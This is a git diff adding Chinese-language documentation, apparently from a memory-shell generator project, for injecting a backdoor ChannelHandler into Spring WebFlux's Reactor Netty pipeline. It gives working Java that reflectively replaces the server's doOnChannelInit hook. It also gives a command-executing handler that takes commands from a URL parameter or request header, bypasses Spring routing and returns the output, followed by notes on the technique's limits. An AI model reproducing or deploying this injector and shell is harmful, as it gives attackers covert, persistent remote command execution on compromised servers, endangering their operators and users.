@@ -1,5 +1,97 @@
 ---
 title: WebFlux Netty Handler
+description: Netty Handler API 允许处理 request 和 response
 ---
 
-WIP
+> [Reactor Netty - Channel Pipeline](https://projectreactor.io/docs/netty/release/reference/index.html#_channel_pipeline)
+>
+> [Netty - ChannelHandler](https://netty.io/wiki/user-guide-for-4.x.html)
+
+Reactor Netty 的每个连接对应一条 `ChannelPipeline`。HTTP 编解码、SSL、超时、访问日志，以及最终把请求交给 WebFlux 的 `HttpTrafficHandler`，都是 pipeline 上的 `ChannelHandler`。在这条链上插入一个 `ChannelHandler`，就能在 HTTP 解码之后、Spring 路由之前直接处理 `HttpRequest`。
+
+## 注入
+
+Spring Boot 的 Netty 服务线程类名包含 `NettyWebServer`（通常是 `NettyWebServer$1`），线程捕获了 `DisposableServer`，合成字段名为 `val$disposableServer`。注入器取该 server 的 config，把 `doOnChannelInit` 替换为注入器自身（实现 `ChannelPipelineConfigurer`）：
+
+```java
+Object config = getFieldValue(getFieldValue(nettyServerThread, "val$disposableServer"), "config");
+setFieldValue(config, "doOnChannelInit", this);
+```
+
+每个新连接初始化时，注入器把 shell 插到 `reactor.left.httpTrafficHandler` 之前：
+
+```java
+public void onChannelInit(ConnectionObserver observer, Channel channel, SocketAddress remoteAddress) {
+    channel.pipeline().addBefore(
+            "reactor.left.httpTrafficHandler",
+            "memshell_handler",
+            (ChannelHandler) handlerClass.newInstance());
+}
+```
+
+此时 pipeline 的关键位置是：
+
+```text
+socket
+  → reactor.left.httpCodec（HttpServerCodec，负责 HTTP 编解码）
+  → memshell_handler（shell）
+  → reactor.left.httpTrafficHandler
+  → WebFlux
+```
+
+shell 收到的是 codec 解码后的 `HttpRequest` / `HttpContent`，写出的 `HttpResponse` 也会沿 pipeline 反向经过 codec 编码后发送。
+
+## NettyHandlerShell
+
+```java
+@ChannelHandler.Sharable
+public class CommandNettyHandler extends ChannelDuplexHandler {
+    public static String paramName;
+
+    @Override
+    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
+        if (msg instanceof HttpRequest) {
+            HttpRequest request = (HttpRequest) msg;
+            String p = getParamFromUrl(request.uri(), paramName);
+            if (p == null || p.isEmpty()) {
+                p = request.headers().get(paramName);
+            }
+            if (p == null) {
+                ctx.fireChannelRead(msg);
+                return;
+            }
+            String result = "";
+            InputStream inputStream = getInputStream(getParam(p));
+            result = new Scanner(inputStream).useDelimiter("\\A").next();
+            send(ctx, result);
+            return;
+        }
+        ctx.fireChannelRead(msg);
+    }
+
+    private void send(ChannelHandlerContext ctx, String result) {
+        FullHttpResponse response = new DefaultFullHttpResponse(
+                HttpVersion.HTTP_1_1, HttpResponseStatus.OK,
+                Unpooled.copiedBuffer(result, StandardCharsets.UTF_8));
+        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
+        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
+    }
+}
+```
+
+1. 只处理 `HttpRequest`，其余消息（`HttpContent`、`LastHttpContent` 等）一律 `ctx.fireChannelRead(msg)` 向后传递，不能吞掉。
+2. 先解析 URI 的 query，再读同名请求头；未命中时把请求交回 pipeline，WebFlux 正常处理。
+3. 命中后写 `FullHttpResponse` 并关闭连接。关闭是必要的：后续请求体仍可能到达，继续复用连接会打乱 HTTP 解析状态。
+4. 不经过 Spring 的任何组件，因此不依赖 Controller、WebFilter、路由或上下文；`paramName` 由生成器写入。
+
+## 限制
+
+**只对新连接生效。** `doOnChannelInit` 只在连接初始化时执行，注入前已建立的 keep-alive 连接不会获得 shell；需要客户端重新建连，或等待连接池自然轮换。
+
+**只适用于 Reactor Netty。** 注入器依赖 Spring Boot 的 `NettyWebServer` 线程与 `reactor.left.httpTrafficHandler` 这个 pipeline 名称。WebFlux 部署在 Servlet 容器时没有该线程；纯 Reactor Netty 手工启动的应用也不适用。
+
+**pipeline 名称是内部约定。** `reactor.left.httpTrafficHandler` 属于 Reactor Netty 内部命名，升级大版本后需要重新确认。当前在 Spring Boot 2 / 3 / 4 的内嵌 Netty 上可用。
+
+**会覆盖已有的 channel 初始化钩子。** `doOnChannelInit` 是 server config 上的单个字段，应用若通过 `NettyServerCustomizer` 设置过自己的配置，注入后会被替换。
+
+**没有 URL Pattern。** 壳会看到新连接上的所有 HTTP 请求，是否命中由参数或请求头决定，与 Spring 的路由表无关。
